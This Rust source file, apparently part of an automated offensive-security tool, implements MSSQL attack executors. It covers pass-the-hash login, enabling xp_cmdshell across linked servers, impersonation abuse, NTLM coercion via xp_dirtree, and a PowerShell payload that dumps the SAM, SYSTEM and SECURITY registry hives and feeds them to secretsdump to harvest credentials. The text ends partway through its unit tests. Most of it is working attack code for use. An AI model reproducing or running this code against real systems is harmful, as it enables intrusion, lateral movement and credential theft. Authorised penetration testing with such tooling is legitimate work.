//! MSSQL tool executors.

use anyhow::{Context, Result};
use base64::Engine;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Build common MSSQL command prefix with auth and optional -windows-auth flag.
///
/// When `hash` is set (and `password` is not the active secret), authenticate
/// via impacket pass-the-hash: `-hashes :NT` plus the password-less
/// `user@target` form. This lets callers connect as an owned principal we hold
/// only an NT hash for — e.g. the linked-server pivot must ride the specific
/// domain login the link's `sp_addlinkedsrvlogin` mapping is keyed on, which
/// we typically own via secretsdump (hash) rather than plaintext.
fn mssql_base(
    domain: Option<&str>,
    username: &str,
    password: Option<&str>,
    hash: Option<&str>,
    target: &str,
    windows_auth: bool,
) -> CommandBuilder {
    CommandBuilder::new("impacket-mssqlclient")
        .args(mssql_auth_args(
            domain,
            username,
            password,
            hash,
            target,
            windows_auth,
        ))
        .timeout_secs(120)
}

/// Build the impacket-mssqlclient auth argv: the `domain/user[:pass]@target`
/// string, an optional `-windows-auth`, and optional `-hashes :NT` for
/// pass-the-hash. When a hash is supplied the password is dropped so the
/// target string stays password-less (impacket rejects a target that carries
/// both a password and `-hashes`).
fn mssql_auth_args(
    domain: Option<&str>,
    username: &str,
    password: Option<&str>,
    hash: Option<&str>,
    target: &str,
    windows_auth: bool,
) -> Vec<String> {
    let pw = if hash.is_some() { None } else { password };
    let mut argv = vec![credentials::impacket_target(domain, username, pw, target)];
    if windows_auth {
        argv.push("-windows-auth".to_string());
    }
    if let Some(h) = hash {
        argv.extend(credentials::hash_args(h));
    }
    argv
}

/// Pipe a SQL query via stdin to an mssqlclient CommandBuilder and execute.
pub(crate) async fn mssql_query(cmd: CommandBuilder, query: &str) -> Result<ToolOutput> {
    cmd.stdin(format!("{query}\nexit\n")).execute().await
}

/// Extract common MSSQL args from JSON and build a base CommandBuilder.
pub(crate) fn mssql_from_args(args: &Value) -> Result<CommandBuilder> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash")
        .or_else(|| optional_str(args, "nt_hash"))
        .or_else(|| optional_str(args, "hashes"));
    let domain = optional_str(args, "domain");
    // Domain auth — whether by password or pass-the-hash — goes through
    // -windows-auth; a hash implies NTLM against a domain account.
    let windows_auth = optional_bool(args, "windows_auth")
        .unwrap_or_else(|| hash.is_some() || domain.is_some_and(|d| !d.is_empty()));

    Ok(mssql_base(
        domain,
        username,
        password,
        hash,
        target,
        windows_auth,
    ))
}

/// Execute a SQL command via impacket-mssqlclient.
///
/// Required args: `target`, `username`, `command`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_command(args: &Value) -> Result<ToolOutput> {
    let command = required_str(args, "command")?;

    mssql_query(mssql_from_args(args)?, command).await
}

/// Enable xp_cmdshell on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_enable_xp_cmdshell(args: &Value) -> Result<ToolOutput> {
    let impersonate_user = optional_str(args, "impersonate_user");
    let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                      EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

    let query = match impersonate_user {
        Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {base_query}"),
        None => base_query.to_string(),
    };

    mssql_query(mssql_from_args(args)?, &query).await
}

/// Enumerate impersonation permissions on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
///
/// Resolves principal IDs to names and the impersonation TARGET login (the
/// `major_id` principal) — `SELECT *` on `sys.server_permissions` only returns
/// numeric IDs, which is useless for deciding who to `EXECUTE AS`. Covers
/// server scope plus the `master` and `msdb` databases (database-level
/// `EXECUTE AS USER` grants live in `sys.database_permissions`, not the
/// server view, so server-only enumeration misses them entirely). The literal
/// `scope` column lets the parser key rows robustly.
pub async fn mssql_enum_impersonation(args: &Value) -> Result<ToolOutput> {
    let query = "\
SELECT 'server' AS scope, gr.name AS grantee, tgt.name AS impersonate_target \
FROM sys.server_permissions p \
JOIN sys.server_principals gr ON p.grantee_principal_id = gr.principal_id \
JOIN sys.server_principals tgt ON p.major_id = tgt.principal_id \
WHERE p.permission_name = 'IMPERSONATE'; \
SELECT 'master' AS scope, gr.name AS grantee, tgt.name AS impersonate_target \
FROM master.sys.database_permissions p \
JOIN master.sys.database_principals gr ON p.grantee_principal_id = gr.principal_id \
JOIN master.sys.database_principals tgt ON p.major_id = tgt.principal_id \
WHERE p.permission_name = 'IMPERSONATE'; \
SELECT 'msdb' AS scope, gr.name AS grantee, tgt.name AS impersonate_target \
FROM msdb.sys.database_permissions p \
JOIN msdb.sys.database_principals gr ON p.grantee_principal_id = gr.principal_id \
JOIN msdb.sys.database_principals tgt ON p.major_id = tgt.principal_id \
WHERE p.permission_name = 'IMPERSONATE';";

    mssql_query(mssql_from_args(args)?, query).await
}

/// Impersonate a login and execute a query on a MSSQL server.
///
/// Required args: `target`, `username`, `impersonate_user`, `query`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_impersonate(args: &Value) -> Result<ToolOutput> {
    let impersonate_user = required_str(args, "impersonate_user")?;
    let query = required_str(args, "query")?;

    let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Enumerate linked servers on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
///
/// Queries `sys.servers WHERE is_linked = 1` rather than `sp_linkedservers`.
/// `sp_linkedservers` returns a multi-column row set whose first data row is
/// NOT reliably the local server — rows come back name-sorted, so an
/// alphabetically earlier linked server (e.g. `sql01`) can precede the local
/// `HOST\INSTANCE`, and the old parser dropped row 0 as "self", silently
/// discarding the real cross-forest link. Its `SRV_PRODUCT` value `SQL Server`
/// also contains a space that breaks whitespace-column parsing. `is_linked = 1`
/// excludes the local server (server_id 0) at the source and returns a single
/// `name` column — one linked server per row, unambiguous to parse. See
/// `parsers::mssql::parse_mssql_linked_servers`.
pub async fn mssql_enum_linked_servers(args: &Value) -> Result<ToolOutput> {
    mssql_query(
        mssql_from_args(args)?,
        "SELECT name FROM sys.servers WHERE is_linked = 1;",
    )
    .await
}

/// Wrap `inner_query` in a source-side `EXECUTE AS LOGIN` if requested.
///
/// Cross-forest linked-server hops fail when the connecting principal can't
/// double-hop (Kerberos delegation/SID filtering). Two source-side workarounds:
/// - `EXECUTE AS LOGIN = 'sa'; <hop>` — runs the hop under sa's mapped login
///   (requires SeImpersonatePrivilege or IMPERSONATE on the target login)
/// - `SELECT * FROM OPENQUERY(...)` — uses the linked-server's configured
///   `sp_addlinkedsrvlogin` mapping (separate path: see `mssql_openquery`)
fn wrap_execute_as(inner_query: &str, impersonate_user: Option<&str>) -> String {
    match impersonate_user {
        Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {inner_query}"),
        None => inner_query.to_string(),
    }
}

/// Execute a query on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `query`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let query = required_str(args, "query")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    let hop = build_linked_exec_hop(query, linked_server);
    let full_query = wrap_execute_as(&hop, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Build the `EXEC ('<query>') AT [<link>]` statement that hops `query` to a
/// linked server.
///
/// The argument to `EXEC (...)` is a single-quoted string literal, so any
/// single quote inside `query` (e.g. `IS_SRVROLEMEMBER('sysadmin')`) would
/// terminate that literal early and the *source* server rejects the whole
/// statement with "Incorrect syntax near 'sysadmin'" before the hop ever
/// reaches the linked server. Double every embedded single quote — the same
/// handling the OPENQUERY path applies to its inner string.
fn build_linked_exec_hop(query: &str, linked_server: &str) -> String {
    let escaped = query.replace('\'', "''");
    format!("EXEC ('{escaped}') AT [{linked_server}];")
}

/// Enable xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_linked_enable_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    let hop = format!(
        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
         EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
    );
    let full_query = wrap_execute_as(&hop, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Execute a command via xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `command`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_linked_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let command = required_str(args, "command")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    let hop = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
    let full_query = wrap_execute_as(&hop, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Query a linked MSSQL server via OPENQUERY using the linked server's
/// configured remote login (sp_addlinkedsrvlogin) — bypasses Kerberos
/// double-hop. This is the cross-forest pivot path when the connecting
/// principal cannot delegate but the linked server has an explicit login
/// mapping (e.g. `RPC OUT = ON` plus a stored credential).
///
/// Required args: `target`, `username`, `linked_server`, `query`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_openquery(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let query = required_str(args, "query")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    // OPENQUERY's inner string uses single quotes; double any embedded ones.
    let escaped = query.replace('\'', "''");
    let openq = format!("SELECT * FROM OPENQUERY([{linked_server}], '{escaped}');");
    let full_query = wrap_execute_as(&openq, impersonate_user);

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Which source-side wrapper to use when hopping a query onto a linked SQL
/// server. `ExecAt` needs `RPC OUT = ON` on the link; `OpenQuery` runs via
/// the link's stored `sp_addlinkedsrvlogin` mapping and works when RPC is
/// disabled. `mssql_far_host_secretsdump` tries them in that order.
#[derive(Clone, Copy)]
enum HopStyle {
    ExecAt,
    OpenQuery,
}

impl std::fmt::Display for HopStyle {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            HopStyle::ExecAt => f.write_str("EXEC AT"),
            HopStyle::OpenQuery => f.write_str("OPENQUERY"),
        }
    }
}

/// Build the SQL that enables `xp_cmdshell` on the far side via the chosen
/// hop style. Idempotent — safe to re-run when it's already on.
fn build_hive_enable_hop(linked_server: &str, style: HopStyle) -> String {
    match style {
        HopStyle::ExecAt => format!(
            "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
             EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
        ),
        // OPENQUERY's inner query must return a rowset — trailing `SELECT 1`
        // satisfies that after the configure/reconfigure has run. All inner
        // single quotes are doubled per T-SQL string escaping.
        HopStyle::OpenQuery => format!(
            "SELECT * FROM OPENQUERY([{linked_server}], \
             'SET FMTONLY OFF; sp_configure ''''show advanced options'''', 1; RECONFIGURE; \
             EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE; SELECT 1 AS ok');"
        ),
    }
}

/// Build the SQL that runs `xp_cmdshell '<ps_cmd>'` on the far side via the
/// chosen hop style. `ps_cmd` is expected to be free of single quotes (our
/// callers use `-EncodedCommand <base64>`, whose alphabet excludes `'`) so
/// no additional escaping of the inner command is required.
fn build_hive_dump_hop(ps_cmd: &str, linked_server: &str, style: HopStyle) -> String {
    match style {
        HopStyle::ExecAt => {
            format!("EXEC ('xp_cmdshell ''{ps_cmd}''') AT [{linked_server}];")
        }
        // Two layers of T-SQL string-literal escaping between us and the
        // xp_cmdshell arg: the outer OPENQUERY literal (single quotes → '')
        // and the inner `xp_cmdshell 'cmd'` literal (single quotes → ''''
        // after the OPENQUERY layer). Base64 has no single quotes so `ps_cmd`
        // itself passes through untouched.
        HopStyle::OpenQuery => format!(
            "SELECT * FROM OPENQUERY([{linked_server}], \
             'SET FMTONLY OFF; EXEC xp_cmdshell ''''{ps_cmd}''''');"
        ),
    }
}

/// Delimiter markers embedded in the PowerShell hive-exfil payload.
///
/// Extracted as constants so the parser and the payload builder can't drift.
/// The `___ARES_HIVE_*` prefix is unusual enough that random xp_cmdshell
/// noise (whoami output, PS errors, mssqlclient row separators) won't
/// collide with the delimiter scan.
const HIVE_MARK_SAM_BEGIN: &str = "___ARES_HIVE_SAM_B64___";
const HIVE_MARK_SAM_END: &str = "___ARES_HIVE_SAM_END___";
const HIVE_MARK_SYSTEM_BEGIN: &str = "___ARES_HIVE_SYSTEM_B64___";
const HIVE_MARK_SYSTEM_END: &str = "___ARES_HIVE_SYSTEM_END___";
const HIVE_MARK_SECURITY_BEGIN: &str = "___ARES_HIVE_SECURITY_B64___";
const HIVE_MARK_SECURITY_END: &str = "___ARES_HIVE_SECURITY_END___";

/// PowerShell payload that reg-saves SAM/SYSTEM/SECURITY on the target and
/// emits each hive as one long base64 line between delimiter rows. The
/// caller wraps this in `powershell -EncodedCommand <utf16le-b64>` so
/// impacket's `xp_cmdshell` layer never has to double-quote the payload
/// through the SQL `EXEC ('...') AT [link]` wrapper.
///
/// Uses `[Console]::Out.WriteLine` (not `Write-Host`) so PowerShell's host
/// wrapping doesn't insert line breaks into the base64 blobs — the hive
/// binary MUST arrive as a single continuous line per hive or the offline
/// impacket-secretsdump parse will fail on truncated / spliced hive data.
fn build_hive_dump_ps_script() -> String {
    format!(
        r#"$ErrorActionPreference='Stop'
$t=$env:TEMP
$a="$t\a.hive";$b="$t\b.hive";$c="$t\c.hive"
reg save HKLM\SAM $a /y | Out-Null
reg save HKLM\SYSTEM $b /y | Out-Null
reg save HKLM\SECURITY $c /y | Out-Null
[Console]::Out.WriteLine('{sam_begin}')
[Console]::Out.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($a)))
[Console]::Out.WriteLine('{sam_end}')
[Console]::Out.WriteLine('{sys_begin}')
[Console]::Out.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($b)))
[Console]::Out.WriteLine('{sys_end}')
[Console]::Out.WriteLine('{sec_begin}')
[Console]::Out.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($c)))
[Console]::Out.WriteLine('{sec_end}')
Remove-Item $a,$b,$c -Force -ErrorAction SilentlyContinue"#,
        sam_begin = HIVE_MARK_SAM_BEGIN,
        sam_end = HIVE_MARK_SAM_END,
        sys_begin = HIVE_MARK_SYSTEM_BEGIN,
        sys_end = HIVE_MARK_SYSTEM_END,
        sec_begin = HIVE_MARK_SECURITY_BEGIN,
        sec_end = HIVE_MARK_SECURITY_END,
    )
}

/// Encode a PowerShell script for `-EncodedCommand`: UTF-16LE bytes,
/// standard-base64. This is the encoding `powershell.exe -EncodedCommand`
/// expects and it means no single-quote / double-quote escaping is
/// required through the `EXEC ('xp_cmdshell ''<cmd>''') AT [link]` wrapper.
pub(crate) fn ps_encoded_command(script: &str) -> String {
    let utf16: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
    base64::engine::general_purpose::STANDARD.encode(utf16)
}

/// True when `c` is in the standard base64 alphabet (`A-Za-z0-9+/=`).
fn is_base64_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='
}

/// Extract the base64 payload framed by `begin` and `end` marker lines.
///
/// impacket's mssqlclient and xp_cmdshell wrap a large base64 blob in various
/// ways: column header ("output"), separator row ("----"), row-count trailer
/// ("(1 rows affected)"), the string "NULL" for a null column, and CR/LF
/// endings. All of those contain characters that aren't in the base64
/// alphabet — so we drop any line that isn't a clean base64 chunk after
/// trimming. That's stricter than "strip empty lines and join": a "NULL"
/// separator (all-uppercase, all base64-alphabet) would previously slip
/// through and corrupt the decoded hive. Returns `None` if either marker is
/// missing or the payload is empty.
fn extract_hive_b64(output: &str, begin: &str, end: &str) -> Option<String> {
    let start = output.find(begin)?;
    let after_begin = &output[start + begin.len()..];
    let end_rel = after_begin.find(end)?;
    let inner = &after_begin[..end_rel];
    let joined: String = inner
        .lines()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .filter(|s| *s != "NULL" && s.chars().all(is_base64_char))
        .collect::<Vec<_>>()
        .join("");
    if joined.is_empty() {
        None
    } else {
        Some(joined)
    }
}

/// Parsed hive triple lifted out of the far-host xp_cmdshell result.
#[cfg_attr(test, derive(Debug))]
struct FarHostHives {
    sam: Vec<u8>,
    system: Vec<u8>,
    security: Vec<u8>,
}

/// Decode the three delimited base64 chunks from the hive-dump PowerShell
/// payload's output. Errors surface exactly which hive failed so the
/// operator can tell whether the reg save or the base64 encode step is
/// broken on the far host.
fn parse_hive_dump_output(output: &str) -> Result<FarHostHives> {
    let sam_b64 = extract_hive_b64(output, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END)
        .context("SAM hive marker/payload missing from xp_cmdshell output")?;
    let sys_b64 = extract_hive_b64(output, HIVE_MARK_SYSTEM_BEGIN, HIVE_MARK_SYSTEM_END)
        .context("SYSTEM hive marker/payload missing from xp_cmdshell output")?;
    let sec_b64 = extract_hive_b64(output, HIVE_MARK_SECURITY_BEGIN, HIVE_MARK_SECURITY_END)
        .context("SECURITY hive marker/payload missing from xp_cmdshell output")?;
    let sam = base64::engine::general_purpose::STANDARD
        .decode(sam_b64.as_bytes())
        .context("SAM hive base64 decode failed")?;
    let system = base64::engine::general_purpose::STANDARD
        .decode(sys_b64.as_bytes())
        .context("SYSTEM hive base64 decode failed")?;
    let security = base64::engine::general_purpose::STANDARD
        .decode(sec_b64.as_bytes())
        .context("SECURITY hive base64 decode failed")?;
    Ok(FarHostHives {
        sam,
        system,
        security,
    })
}

/// Harvest SAM/SYSTEM/SECURITY hives from a linked (typically cross-forest)
/// SQL host via `xp_cmdshell` on the link hop, then parse them locally with
/// `impacket-secretsdump LOCAL`. The output is the standard secretsdump
/// text — the existing secretsdump parser handles it verbatim, so hashes
/// and cached-cred rows land in state through the normal discovery path.
///
/// This is the primitive that converts a link-pivot sysadmin foothold into
/// far-forest OS credentials — before this tool existed, a confirmed
/// sysadmin on a cross-forest linked SQL host was marked owned but no
/// downstream cred harvest fired (SMB-based `auto_local_admin_secretsdump`
/// needs an admin cred for the far domain, which by definition we do not
/// have yet). See `orchestrator/automation/mssql_link_pivot.rs`.
///
/// Required args: `target`, `username`, `linked_server`
/// Optional args: `password`, `hash`, `domain`, `windows_auth`,
///                `impersonate_user`
pub async fn mssql_far_host_secretsdump(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let impersonate_user = optional_str(args, "impersonate_user");

    let script = build_hive_dump_ps_script();
    let encoded = ps_encoded_command(&script);
    let ps_cmd = format!("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}");

    // Try the EXEC-AT hop first — it's the standard cross-forest link path.
    // If the link is configured without `RPC OUT = ON` (or otherwise refuses
    // ad-hoc EXEC) but still permits OPENQUERY via a stored login mapping,
    // fall back to OPENQUERY. Both paths are noisy but only one needs to
    // survive to land the hives.
    let mut attempts: Vec<(HopStyle, ToolOutput, ToolOutput)> = Vec::new();
    let mut hives: Option<FarHostHives> = None;

    for style in [HopStyle::ExecAt, HopStyle::OpenQuery] {
        // Enable xp_cmdshell on the far side — idempotent, safe to re-run.
        let enable_hop = build_hive_enable_hop(linked_server, style);
        let enable_full = wrap_execute_as(&enable_hop, impersonate_user);
        let enable_out = mssql_query(mssql_from_args(args)?, &enable_full).await?;

        let dump_hop = build_hive_dump_hop(&ps_cmd, linked_server, style);
        let dump_full = wrap_execute_as(&dump_hop, impersonate_user);
        let dump_out = mssql_query(mssql_from_args(args)?, &dump_full).await?;

        let combined = dump_out.combined_raw();
        if let Ok(h) = parse_hive_dump_output(&combined) {
            hives = Some(h);
            break;
        }
        attempts.push((style, enable_out, dump_out));
    }

    let Some(hives) = hives else {
        // Both paths failed — surface every attempt's raw output so the
        // caller can see which one got closest (e.g. link permissions
        // vs. `reg save` "Access is denied" on the far host).
        let mut msg =
            String::from("mssql_far_host_secretsdump: hive extraction failed on all hop styles");
        for (style, enable_out, dump_out) in &attempts {
            msg.push_str(&format!(
                "\n\n=== {style} ===\n\
                 enable exit={:?} success={}\n\
                 dump   exit={:?} success={}\n\
                 --- enable combined ---\n{}\n\
                 --- dump combined ---\n{}",
                enable_out.exit_code,
                enable_out.success,
                dump_out.exit_code,
                dump_out.success,
                enable_out.combined_raw(),
                dump_out.combined_raw(),
            ));
        }
        let last_exit = attempts.last().and_then(|(_, _, d)| d.exit_code);
        return Ok(ToolOutput {
            stdout: String::new(),
            stderr: msg,
            exit_code: last_exit,
            success: false,
        });
    };

    // Save the decoded hives to a unique temp dir per-invocation so
    // concurrent far-host dumps don't collide on the same paths.
    let tmp_root = std::env::temp_dir();
    let tag = uuid::Uuid::new_v4().simple().to_string();
    let workdir = tmp_root.join(format!("ares-hive-{tag}"));
    std::fs::create_dir_all(&workdir).with_context(|| {
        format!(
            "creating hive-dump workdir {} for mssql_far_host_secretsdump",
            workdir.display()
        )
    })?;
    let sam_path = workdir.join("sam.hive");
    let sys_path = workdir.join("system.hive");
    let sec_path = workdir.join("security.hive");
    std::fs::write(&sam_path, &hives.sam).context("writing sam.hive")?;
    std::fs::write(&sys_path, &hives.system).context("writing system.hive")?;
    std::fs::write(&sec_path, &hives.security).context("writing security.hive")?;

    let sd = CommandBuilder::new("impacket-secretsdump")
        .arg("-sam")
        .arg(sam_path.to_string_lossy().to_string())
        .arg("-system")
        .arg(sys_path.to_string_lossy().to_string())
        .arg("-security")
        .arg(sec_path.to_string_lossy().to_string())
        .arg("LOCAL")
        .timeout_secs(180)
        .execute()
        .await;

    // Always try to clean up the hive files, even if secretsdump errored,
    // so a series of failures doesn't leak megabytes of registry hives.
    let _ = std::fs::remove_dir_all(&workdir);

    sd
}

/// Coerce NTLM authentication from a MSSQL server via xp_dirtree.
///
/// Required args: `target`, `username`, `listener_ip`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
    let listener_ip = required_str(args, "listener_ip")?;

    let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");

    mssql_query(mssql_from_args(args)?, &full_query).await
}

#[cfg(test)]
mod tests {
    use super::{
        build_hive_dump_hop, build_hive_dump_ps_script, build_hive_enable_hop,
        build_linked_exec_hop, extract_hive_b64, mssql_auth_args, parse_hive_dump_output,
        ps_encoded_command, HopStyle, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END,
        HIVE_MARK_SECURITY_BEGIN, HIVE_MARK_SECURITY_END, HIVE_MARK_SYSTEM_BEGIN,
        HIVE_MARK_SYSTEM_END,
    };
    use crate::args::{optional_bool, optional_str, required_str};
    use crate::credentials;
    use base64::Engine;
    use serde_json::json;

    // ── far-host hive-dump helpers ──────────────────────────────────────

    #[test]
    fn ps_encoded_command_roundtrips_utf16le_base64() {
        // -EncodedCommand takes UTF-16LE base64. Verify by decoding.
        let encoded = ps_encoded_command("Write-Host 'ok'");
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(encoded.as_bytes())
            .expect("valid base64");
        assert_eq!(bytes.len() % 2, 0, "UTF-16LE payload must be even-length");
        let utf16: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        let decoded = String::from_utf16(&utf16).expect("valid utf-16");
        assert_eq!(decoded, "Write-Host 'ok'");
    }

    #[test]
    fn hive_dump_script_contains_all_three_delimiters() {
        // If a delimiter is missing the parser will silently drop that hive
        // — this test guards against a stray edit to the payload.
        let script = build_hive_dump_ps_script();
        assert!(script.contains(HIVE_MARK_SAM_BEGIN));
        assert!(script.contains(HIVE_MARK_SAM_END));
        assert!(script.contains(HIVE_MARK_SYSTEM_BEGIN));
        assert!(script.contains(HIVE_MARK_SYSTEM_END));
        assert!(script.contains(HIVE_MARK_SECURITY_BEGIN));
        assert!(script.contains(HIVE_MARK_SECURITY_END));
        // Must reg-save all three hives, in the /y (overwrite) form.
        assert!(script.contains("reg save HKLM\\SAM"));
        assert!(script.contains("reg save HKLM\\SYSTEM"));
        assert!(script.contains("reg save HKLM\\SECURITY"));
    }

    #[test]
    fn hive_dump_script_uses_console_out_writeline_not_write_host() {
        // Write-Host wraps at the PowerShell host's console width, which
        // splices newlines into the base64 blobs and breaks the offline
        // secretsdump parse. Must use `[Console]::Out.WriteLine` for the
        // hive lines.
        let script = build_hive_dump_ps_script();
        assert!(
            script.contains("[Console]::Out.WriteLine"),
            "hive lines must go through [Console]::Out.WriteLine to avoid host-width wrapping"
        );
    }

    #[test]
    fn extract_hive_b64_finds_delimited_payload() {
        let out = format!(
            "SQL> EXEC ('xp_cmdshell') AT [LINK]\nheader\n---\n{begin}\nAAAA\n{end}\nother garbage",
            begin = HIVE_MARK_SAM_BEGIN,
            end = HIVE_MARK_SAM_END,
        );
        let got = extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END);
        assert_eq!(got.as_deref(), Some("AAAA"));
    }

    #[test]
    fn extract_hive_b64_joins_multiline_payload() {
        // impacket's mssqlclient may insert its own row-separator whitespace
        // around the base64 line — the extractor must strip empty lines and
        // rejoin so the base64 decodes cleanly.
        let out = format!(
            "{begin}\n   \nAAAA\n\nBBBB\n{end}",
            begin = HIVE_MARK_SAM_BEGIN,
            end = HIVE_MARK_SAM_END,
        );
        assert_eq!(
            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END).as_deref(),
            Some("AAAABBBB")
        );
    }

    #[test]
    fn extract_hive_b64_rejects_mssqlclient_row_noise() {
        // mssqlclient can splice in a "NULL" row, a `(1 rows affected)`
        // trailer, or a "----" divider between base64 rows. Before the
        // per-line base64-alphabet filter, "NULL" (all base64-alphabet chars)
        // would slip through and corrupt the decoded hive. All three noise
        // shapes must be dropped so the surviving base64 concatenates
        // cleanly.
        let out = format!(
            "{begin}\nAAAA\n----\nBBBB\nNULL\nCCCC\n(1 rows affected)\nDDDD\n{end}",
            begin = HIVE_MARK_SAM_BEGIN,
            end = HIVE_MARK_SAM_END,
        );
        assert_eq!(
            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END).as_deref(),
            Some("AAAABBBBCCCCDDDD")
        );
    }

    #[test]
    fn extract_hive_b64_survives_crlf_line_endings() {
        // Windows/MSSQL side sends CRLF; str::lines strips the LF, trim strips
        // the CR. Sanity-check that the extractor still concatenates cleanly
        // — a stray CR making it into the joined blob would break base64.
        let out = format!(
            "{begin}\r\nAAAA\r\nBBBB\r\n{end}",
            begin = HIVE_MARK_SAM_BEGIN,
            end = HIVE_MARK_SAM_END,
        );
        assert_eq!(
            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END).as_deref(),
            Some("AAAABBBB")
        );
    }

    #[test]
    fn extract_hive_b64_returns_none_when_marker_missing() {
        assert_eq!(
            extract_hive_b64("no markers here", HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END),
            None
        );
    }

    #[test]
    fn extract_hive_b64_returns_none_on_empty_payload() {
        let out = format!(
            "{begin}\n\n\n{end}",
            begin = HIVE_MARK_SAM_BEGIN,
            end = HIVE_MARK_SAM_END,
        );
        assert_eq!(
            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END),
            None
        );
    }

    #[test]
    fn parse_hive_dump_output_decodes_all_three_hives() {
        let b64 = base64::engine::general_purpose::STANDARD.encode(b"regf-goes-here");
        let out = format!(
            "row header\n\
             {sam_b}\n{b}\n{sam_e}\n\
             {sys_b}\n{b}\n{sys_e}\n\
             {sec_b}\n{b}\n{sec_e}\n",
            sam_b = HIVE_MARK_SAM_BEGIN,
            sam_e = HIVE_MARK_SAM_END,
            sys_b = HIVE_MARK_SYSTEM_BEGIN,
            sys_e = HIVE_MARK_SYSTEM_END,
            sec_b = HIVE_MARK_SECURITY_BEGIN,
            sec_e = HIVE_MARK_SECURITY_END,
            b = b64,
        );
        let hives = parse_hive_dump_output(&out).expect("all three hives decode");
        assert_eq!(hives.sam, b"regf-goes-here");
        assert_eq!(hives.system, b"regf-goes-here");
        assert_eq!(hives.security, b"regf-goes-here");
    }

    #[test]
    fn parse_hive_dump_output_names_missing_hive_in_error() {
        // Diagnostic clarity: the error message must identify which hive
        // failed so the operator can tell whether reg save is denied for
        // one hive class (e.g. SECURITY without SeBackupPrivilege) but not
        // the others.
        let b64 = base64::engine::general_purpose::STANDARD.encode(b"x");
        let out = format!(
            "{sam_b}\n{b}\n{sam_e}\n{sys_b}\n{b}\n{sys_e}\n",
            sam_b = HIVE_MARK_SAM_BEGIN,
            sam_e = HIVE_MARK_SAM_END,
            sys_b = HIVE_MARK_SYSTEM_BEGIN,
            sys_e = HIVE_MARK_SYSTEM_END,
            b = b64,
        );
        let err = parse_hive_dump_output(&out).unwrap_err().to_string();
        assert!(
            err.contains("SECURITY"),
            "missing-hive error must name SECURITY: got {err:?}"
        );
    }

    #[test]
    fn auth_args_password_form() {
        let argv = mssql_auth_args(
            Some("contoso.local"),
            "alice",
            Some("P@ssw0rd!"),
            None,
            "192.168.58.51",
            true,
